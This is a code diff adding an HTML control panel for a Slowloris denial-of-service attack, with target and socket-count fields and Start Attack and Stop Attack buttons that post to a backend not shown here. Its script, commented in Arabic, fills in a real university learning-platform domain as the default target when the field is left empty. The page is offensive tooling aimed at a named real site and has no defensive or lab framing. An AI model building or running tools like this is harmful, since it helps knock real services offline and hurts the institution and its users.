@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Slowloris Control Panel</title>
+    <link rel="stylesheet" href="/static/styles.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Slowloris Control Panel</h1>
+        <form id="attack-form">
+            <label for="target">Target URL:</label>
+            <input type="text" id="target" name="target" required placeholder="e.g., example.com">
+            
+            <label for="sockets">Number of Sockets:</label>
+            <input type="number" id="sockets" name="sockets" value="150">
+
+            <button type="button" id="start-btn">Start Attack</button>
+            <button type="button" id="stop-btn">Stop Attack</button>
+        </form>
+
+        <div id="response-message"></div>
+    </div>
+
+    <script>
+        // عند الضغط على "Start Attack"
+        document.getElementById('start-btn').addEventListener('click', () => {
+            const targetInput = document.getElementById('target');
+            const sockets = document.getElementById('sockets').value;
+
+            // إذا كان الحقل فارغًا، يتم تعبئته تلقائيًا بالموقع المحدد
+            if (!targetInput.value) {
+                targetInput.value = "lms.nmu.edu.eg";
+            }
+
+            const target = targetInput.value;
+
+            fetch('/start', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ target, sockets })
+            })
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('response-message').innerText = data.message;
+            })
+            .catch(err => {
+                document.getElementById('response-message').innerText = 'Error: ' + err.message;
+            });
+        });
+
+        // عند الضغط على "Stop Attack"
+        document.getElementById('stop-btn').addEventListener('click', () => {
+            fetch('/stop', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('response-message').innerText = data.message;
+            })
+            .catch(err => {
+                document.getElementById('response-message').innerText = 'Error: ' + err.message;
+            });
+        });
+    </script>
+</body>
+</html>
